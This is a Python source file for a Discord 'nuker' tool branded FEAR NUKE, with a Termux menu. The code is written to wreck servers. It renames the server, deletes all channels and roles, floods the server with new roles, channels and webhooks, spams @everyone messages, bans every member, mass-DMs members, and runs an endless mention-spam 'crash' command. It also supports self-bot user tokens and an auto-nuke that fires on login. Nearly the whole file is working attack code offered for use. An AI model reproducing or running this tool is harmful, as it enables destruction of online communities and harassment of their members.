#!/data/data/com.termux/files/usr/bin/python3
import discord
from discord.ext import commands
import asyncio
import random
import string
import os
import aiohttp
import json
import time
from colorama import Fore, Style, init
import datetime
from pyfiglet import Figlet
import sys
import readline

# Initialize colorama
init()

# Configuration file path
CONFIG_FILE = "fear_config.json"

# Default configuration
DEFAULT_CONFIG = {
    "TOKEN": "YOUR_TOKEN_HERE",
    "TOKEN_TYPE": "bot",  # or "user" for self-bot
    "PREFIX": "!",
    "GUILD_NAMES": ["FEAR.IO DOMINATES", "NUKED BY FEAR", "GET REKT NOOBS", "FEAR WAS HERE"],
    "CHANNEL_NAMES": ["nuked-by-fear", "get-rekt", "fear-owns-you", "discord-crashed"],
    "SPAM_MESSAGES": [
        "@everyone **FEAR.IO HAS TAKEN OVER** https://discord.gg/fear",
        "@everyone **YOUR SERVER IS COMPROMISED** :skull:",
        "@everyone **WAKE UP SHEEPLE** https://fear.io",
        "@everyone **THIS IS WHAT HAPPENS WHEN YOU MESS WITH FEAR** :fire:"
    ],
    "ROLE_NAME": "FEAR OWNED YOU",
    "WEBHOOK_NAME": "FEAR_LOGS",
    "REASON": "NUKED BY FEAR.IO | https://fear.io",
    "MAX_CHANNELS": 50,
    "MAX_ROLES": 50,
    "MESSAGES_PER_CHANNEL": 100,
    "DM_SPAM_COUNT": 3,
    "RAID_MODE": False,
    "AUTO_NUKE": False
}

# Load or create config
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        return DEFAULT_CONFIG

config = load_config()

# Initialize bot with proper intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config['PREFIX'], intents=intents, self_bot=(config['TOKEN_TYPE'] == "user"))
session = aiohttp.ClientSession()

# ASCII Art Colors
class ArtColors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_banner():
    custom_fig = Figlet(font='slant')
    banner = custom_fig.renderText('FEAR NUKE')
    print(f"{ArtColors.RED}{ArtColors.BOLD}{banner}{ArtColors.END}")
    print(f"{ArtColors.CYAN}⚡ Hyper Mega Ultra Discord Nuker v4.0 {ArtColors.END}")
    print(f"{ArtColors.YELLOW}📅 {datetime.datetime.now()}{ArtColors.END}")
    print(f"{ArtColors.RED}☠️  Token Type: {config['TOKEN_TYPE'].upper()}{ArtColors.END}")
    print(f"{ArtColors.RED}⚠️  Self-bots violate Discord ToS! Use at your own risk!{ArtColors.END}\n")

def termux_menu():
    while True:
        os.system('clear')
        print_banner()
        print(f"{ArtColors.GREEN}📱 Termux Menu:{ArtColors.END}")
        print(f"{ArtColors.CYAN}1. Start Nuker {config['TOKEN_TYPE'].upper()} Token{ArtColors.END}")
        print(f"{ArtColors.BLUE}2. Edit Configuration{ArtColors.END}")
        print(f"{ArtColors.MAGENTA}3. View Current Config{ArtColors.END}")
        print(f"{ArtColors.YELLOW}4. Switch Token Type (Current: {config['TOKEN_TYPE']}){ArtColors.END}")
        print(f"{ArtColors.RED}5. Exit{ArtColors.END}")
        
        choice = input(f"\n{ArtColors.WHITE}Select an option (1-5): {ArtColors.END}")
        
        if choice == "1":
            start_bot()
        elif choice == "2":
            edit_config()
        elif choice == "3":
            view_config()
        elif choice == "4":
            toggle_token_type()
        elif choice == "5":
            print(f"{ArtColors.RED}Exiting...{ArtColors.END}")
            sys.exit(0)
        else:
            print(f"{ArtColors.RED}Invalid choice!{ArtColors.END}")
            time.sleep(1)

def toggle_token_type():
    os.system('clear')
    print_banner()
    config['TOKEN_TYPE'] = "user" if config['TOKEN_TYPE'] == "bot" else "bot"
    save_config()
    print(f"{ArtColors.GREEN}✅ Token type switched to: {config['TOKEN_TYPE'].upper()}{ArtColors.END}")
    print(f"{ArtColors.YELLOW}⚠️  Restart the bot for changes to take effect!{ArtColors.END}")
    time.sleep(2)

def edit_config():
    os.system('clear')
    print_banner()
    print(f"{ArtColors.BLUE}📝 Edit Configuration:{ArtColors.END}\n")
    
    for i, (key, value) in enumerate(config.items(), 1):
        print(f"{ArtColors.CYAN}{i}. {key}: {ArtColors.YELLOW}{value}{ArtColors.END}")
    
    try:
        choice = int(input(f"\n{ArtColors.WHITE}Select item to edit (1-{len(config)}): {ArtColors.END}")) - 1
        if 0 <= choice < len(config):
            key = list(config.keys())[choice]
            print(f"\n{ArtColors.CYAN}Current {key}: {ArtColors.YELLOW}{config[key]}{ArtColors.END}")
            
            if isinstance(config[key], list):
                print(f"{ArtColors.MAGENTA}Enter new values (comma separated):{ArtColors.END}")
                new_value = input("> ").split(',')
                new_value = [x.strip() for x in new_value]
            elif isinstance(config[key], bool):
                new_value = input("> ").lower() in ['true', 'yes', 'y', '1']
            elif isinstance(config[key], int):
                new_value = int(input("> "))
            else:
                new_value = input("> ")
            
            config[key] = new_value
            save_config()
            print(f"{ArtColors.GREEN}✅ Configuration updated!{ArtColors.END}")
        else:
            print(f"{ArtColors.RED}Invalid selection!{ArtColors.END}")
    except ValueError:
        print(f"{ArtColors.RED}Please enter a valid number!{ArtColors.END}")
    
    input(f"\n{ArtColors.WHITE}Press Enter to continue...{ArtColors.END}")

def view_config():
    os.system('clear')
    print_banner()
    print(f"{ArtColors.BLUE}📋 Current Configuration:{ArtColors.END}\n")
    
    for key, value in config.items():
        print(f"{ArtColors.CYAN}{key}: {ArtColors.YELLOW}{value}{ArtColors.END}")
    
    input(f"\n{ArtColors.WHITE}Press Enter to continue...{ArtColors.END}")

def save_config():
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def start_bot():
    os.system('clear')
    print_banner()
    print(f"{ArtColors.GREEN}🚀 Starting Nuker {config['TOKEN_TYPE'].upper()}...{ArtColors.END}")
    print(f"{ArtColors.CYAN}🛠️  Using prefix: {config['PREFIX']}{ArtColors.END}")
    print(f"{ArtColors.YELLOW}⚡ Press Ctrl+C to stop the bot{ArtColors.END}\n")
    
    try:
        if config['TOKEN_TYPE'] == "user":
            print(f"{ArtColors.RED}⚠️  WARNING: Using user token (self-bot){ArtColors.END}")
            print(f"{ArtColors.RED}⚠️  This violates Discord ToS and may get your account banned!{ArtColors.END}")
            confirm = input(f"{ArtColors.WHITE}Are you sure? (y/n): {ArtColors.END}").lower()
            if confirm not in ['y', 'yes']:
                return
        
        bot.run(config['TOKEN'], bot=(config['TOKEN_TYPE'] == "bot"))
    except discord.LoginFailure:
        print(f"{ArtColors.RED}❌ Invalid token! Please check your config.{ArtColors.END}")
    except Exception as e:
        print(f"{ArtColors.RED}❌ Error starting bot: {e}{ArtColors.END}")
    input(f"\n{ArtColors.WHITE}Press Enter to continue...{ArtColors.END}")

# Bot events
@bot.event
async def on_ready():
    print_banner()
    print(f'{ArtColors.GREEN}⚡ Logged in as {bot.user.name} (ID: {bot.user.id}){ArtColors.END}')
    print(f'{ArtColors.RED}☢️  Ultra Hyper Nuke Bot activated!{ArtColors.END}')
    print(f'{ArtColors.CYAN}🔄 Auto Nuke: {"ENABLED" if config["AUTO_NUKE"] else "DISABLED"}{ArtColors.END}')
    
    activity = discord.Game(name=f"{config['PREFIX']}nuke | {config['TOKEN_TYPE'].upper()} MODE")
    await bot.change_presence(activity=activity)
    
    if config["AUTO_NUKE"]:
        for guild in bot.guilds:
            try:
                await perform_nuke(guild)
            except Exception as e:
                print(f'{ArtColors.RED}❌ Auto nuke failed in {guild.name}: {e}{ArtColors.END}')

async def perform_nuke(guild):
    """Perform the nuke operation on a guild"""
    print(f'{ArtColors.RED}☠️ Starting nuke on {guild.name}{ArtColors.END}')
    
    # Step 1: Rename server
    new_name = random.choice(config['GUILD_NAMES'])
    await guild.edit(name=new_name)
    print(f'{ArtColors.GREEN}🏷️ Renamed server to: {new_name}{ArtColors.END}')
    
    # Step 2: Delete all channels
    await delete_all_channels(guild)
    
    # Step 3: Delete all roles
    await delete_all_roles(guild)
    
    # Step 4: Create mass roles
    await create_mass_roles(guild)
    
    # Step 5: Create mass channels and start spamming
    tasks = await create_mass_channels(guild)
    
    # Step 6: Ban all members
    await ban_all_members(guild)
    
    # Step 7: Mass DM all members
    await massdm_auto(guild)
    
    # Wait for all tasks to complete
    await asyncio.gather(*tasks)
    
    print(f'{ArtColors.RED}💥 NUKE COMPLETED ON {guild.name}!{ArtColors.END}')

async def delete_all_channels(guild):
    """Delete all channels in the guild"""
    tasks = []
    for channel in guild.channels:
        tasks.append(asyncio.create_task(channel.delete()))
        print(f'{ArtColors.RED}☠️ Deleting channel: {channel.name}{ArtColors.END}')
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def delete_all_roles(guild):
    """Delete all roles in the guild"""
    tasks = []
    for role in guild.roles:
        if role.name != "@everyone":
            tasks.append(asyncio.create_task(role.delete()))
            print(f'{ArtColors.RED}☠️ Deleting role: {role.name}{ArtColors.END}')
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def create_mass_roles(guild):
    """Create mass roles to overload the server"""
    tasks = []
    for i in range(config['MAX_ROLES']):
        try:
            role_name = f"{config['ROLE_NAME']}-{''.join(random.choices(string.digits + string.ascii_letters, k=8))}"
            color = discord.Color(random.randint(0, 0xFFFFFF))
            tasks.append(asyncio.create_task(guild.create_role(name=role_name, color=color, hoist=True, mentionable=True)))
            print(f'{ArtColors.MAGENTA}🎭 Creating role: {role_name}{ArtColors.END}')
        except Exception as e:
            print(f'{ArtColors.YELLOW}⚠️ Failed to create role: {e}{ArtColors.END}')
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def create_mass_channels(guild):
    """Create mass channels and webhooks"""
    tasks = []
    for i in range(config['MAX_CHANNELS']):
        try:
            channel_name = f"{random.choice(config['CHANNEL_NAMES'])}-{''.join(random.choices(string.digits, k=6))}"
            channel = await guild.create_text_channel(channel_name)
            print(f'{ArtColors.GREEN}🔥 Created channel: {channel.name}{ArtColors.END}')
            
            # Create multiple webhooks per channel
            for _ in range(3):
                try:
                    webhook = await channel.create_webhook(name=f"{config['WEBHOOK_NAME']}-{random.randint(1000,9999)}")
                    print(f'{ArtColors.BLUE}🪝 Created webhook in {channel.name}{ArtColors.END}')
                    tasks.append(spam_webhook(webhook.url))
                except:
                    pass
            
            tasks.append(spam_channel(channel))
            
        except Exception as e:
            print(f'{ArtColors.YELLOW}⚠️ Failed to create channel: {e}{ArtColors.END}')
    
    return tasks

async def spam_webhook(webhook_url):
    """Spam messages via webhook"""
    for _ in range(config['MESSAGES_PER_CHANNEL']):
        try:
            message = random.choice(config['SPAM_MESSAGES'])
            async with session.post(webhook_url, json={"content": message}) as resp:
                if resp.status == 204:
                    print(f'{ArtColors.CYAN}🪝 Webhook spam successful{ArtColors.END}')
        except Exception as e:
            print(f'{ArtColors.YELLOW}⚠️ Webhook spam failed: {e}{ArtColors.END}')
        await asyncio.sleep(0.1)

async def spam_channel(channel):
    """Spam messages in a channel"""
    for _ in range(config['MESSAGES_PER_CHANNEL']):
        try:
            message = random.choice(config['SPAM_MESSAGES'])
            await channel.send(message + "\n" + " ".join(["@everyone"]*3))
            print(f'{ArtColors.CYAN}💣 Spammed in {channel.name}{ArtColors.END}')
        except Exception as e:
            print(f'{ArtColors.YELLOW}⚠️ Failed to spam in {channel.name}: {e}{ArtColors.END}')
        await asyncio.sleep(0.1)

async def ban_all_members(guild):
    """Ban all members in the guild"""
    tasks = []
    for member in guild.members:
        try:
            if member != bot.user:
                tasks.append(asyncio.create_task(member.ban(reason=config['REASON'], delete_message_days=7)))
                print(f'{ArtColors.RED}🔨 Banning member: {member.name}{ArtColors.END}')
        except Exception as e:
            print(f'{ArtColors.YELLOW}⚠️ Failed to ban {member.name}: {e}{ArtColors.END}')
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def massdm_auto(guild):
    """Automatically mass DM all server members"""
    for member in guild.members:
        try:
            if not member.bot:
                for _ in range(config['DM_SPAM_COUNT']):
                    await member.send(random.choice(config['SPAM_MESSAGES']))
                    print(f'{ArtColors.GREEN}✉️ Sent DM to {member.name}{ArtColors.END}')
                    await asyncio.sleep(0.5)
        except Exception as e:
            print(f'{ArtColors.YELLOW}⚠️ Failed to DM {member.name}: {e}{ArtColors.END}')

@bot.command(name='nuke')
async def nuke(ctx):
    """The ultimate nuke command"""
    if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
        await ctx.send("You need administrator permissions to use this command!")
        return
    
    await perform_nuke(ctx.guild)

@bot.command(name='raid')
async def raid(ctx):
    """Spam channels without deleting everything"""
    if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
        await ctx.send("You need administrator permissions to use this command!")
        return
    
    tasks = await create_mass_channels(ctx.guild)
    await asyncio.gather(*tasks)

@bot.command(name='crash')
async def crash(ctx):
    """Crash the server with mentions"""
    if not ctx.author.guild_permissions.administrator and config['TOKEN_TYPE'] == "bot":
        await ctx.send("You need administrator permissions to use this command!")
        return
    
    try:
        while True:
            await ctx.send("@everyone " * 10 + "SERVER CRASHED BY FEAR.IO " * 5 + ":boom:" * 5)
            await asyncio.sleep(0.1)
    except:
        pass

if __name__ == "__main__":
    try:
        termux_menu()
    except KeyboardInterrupt:
        print(f"\n{ArtColors.RED}🚫 Operation cancelled by user{ArtColors.END}")
    finally:
        try:
            asyncio.run(session.close())
        except:
            pass
